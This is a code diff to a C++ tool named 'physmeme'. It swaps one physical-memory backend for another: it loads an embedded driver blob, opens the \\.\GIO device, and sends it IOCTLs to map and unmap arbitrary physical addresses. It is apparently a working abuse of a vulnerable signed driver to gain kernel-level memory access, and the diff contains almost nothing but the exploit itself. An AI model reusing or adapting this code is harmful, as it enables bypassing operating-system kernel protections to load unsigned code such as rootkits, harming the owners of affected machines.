@@ -5,13 +5,57 @@
 #include <map>
 
 #include "../util/util.hpp"
+#include "../loadup.hpp"
+#include "../raw_driver.hpp"
+
+#pragma pack ( push, 1 )
+typedef struct _GIOMAP
+{
+	unsigned long	interface_type;
+	unsigned long	bus;
+	std::uintptr_t  physical_address;
+	unsigned long	io_space;
+	unsigned long	size;
+} GIOMAP;
+#pragma pack ( pop )
 
 namespace physmeme
 {
+	inline std::string drv_key;
+
 	//
 	// please code this function depending on your method of physical read/write.
 	//
-	static std::uintptr_t map_phys(
+	inline HANDLE load_drv()
+	{
+		const auto [result, key] = driver::load(raw_driver, sizeof(raw_driver));
+		drv_key = key;
+
+		return CreateFile(
+			"\\\\.\\GIO",
+			GENERIC_READ | GENERIC_WRITE, 
+			NULL,
+			NULL,
+			OPEN_EXISTING, 
+			FILE_ATTRIBUTE_NORMAL, 
+			NULL
+		);
+	}
+
+	//
+	// please code this function depending on your method of physical read/write.
+	//
+	inline bool unload_drv()
+	{
+		return driver::unload(drv_key);
+	}
+
+	inline HANDLE drv_handle = load_drv();
+
+	//
+	// please code this function depending on your method of physical read/write.
+	//
+	inline std::uintptr_t map_phys(
 		std::uintptr_t addr,
 		std::size_t size
 	)
@@ -20,52 +64,29 @@ namespace physmeme
 		if (!util::is_valid(addr))
 			return NULL;
 
-		static const auto map_phys_ptr =
-			reinterpret_cast<__int64(__fastcall*)(__int64, unsigned)>(
-				GetProcAddress(LoadLibrary("pmdll64.dll"), "MapPhyMem"));
-		return map_phys_ptr ? map_phys_ptr(addr, size) : false;
+		GIOMAP in_buffer = { 0, 0, addr, 0, size };
+		uintptr_t out_buffer[2] = { 0 };
+		unsigned long returned = 0;
+		DeviceIoControl(drv_handle, 0xC3502004, reinterpret_cast<LPVOID>(&in_buffer), sizeof(in_buffer),
+			reinterpret_cast<LPVOID>(out_buffer), sizeof(out_buffer), &returned, NULL);
+		return out_buffer[0];
+
 	}
 
 	//
 	// please code this function depending on your method of physical read/write.
 	//
-	static bool unmap_phys(
+	inline bool unmap_phys(
 		std::uintptr_t addr,
 		std::size_t size
 	)
 	{
-		static const auto unmap_phys_ptr =
-			reinterpret_cast<__int64(*)(__int64, unsigned)>(
-				GetProcAddress(LoadLibrary("pmdll64.dll"), "UnmapPhyMem"));
-		return unmap_phys_ptr ? unmap_phys_ptr(addr, size) : false;
+		uintptr_t in_buffer = addr;
+		uintptr_t out_buffer[2] = {sizeof(out_buffer)};
+
+		unsigned long returned = NULL;
+		DeviceIoControl(drv_handle, 0xC3502008, reinterpret_cast<LPVOID>(&in_buffer), sizeof(in_buffer),
+			reinterpret_cast<LPVOID>(out_buffer), sizeof(out_buffer), &returned, NULL);
+		return out_buffer[0];
 	}
-
-	//
-	// please code this function depending on your method of physical read/write.
-	//
-	static HANDLE load_drv()
-	{
-		static const auto load_driver_ptr =
-			reinterpret_cast<__int64(*)()>(
-				GetProcAddress(LoadLibrary("pmdll64.dll"), "LoadPhyMemDriver"));
-
-		if (load_driver_ptr)
-			load_driver_ptr();
-
-		//--- i dont ever use this handle, its just an example of what you should do.
-		return CreateFileA("\\\\.\\PhyMem", 0xC0000000, 3u, 0i64, 3u, 0x80u, 0i64);
-	}
-
-	//
-	// please code this function depending on your method of physical read/write.
-	//
-	static bool unload_drv()
-	{
-		static const auto unload_driver_ptr =
-			reinterpret_cast<__int64(*)()>(
-				GetProcAddress(LoadLibrary("pmdll64.dll"), "UnloadPhyMemDriver"));
-		return unload_driver_ptr ? unload_driver_ptr() : false;
-	}
-
-	static HANDLE drv_handle = load_drv();
 }
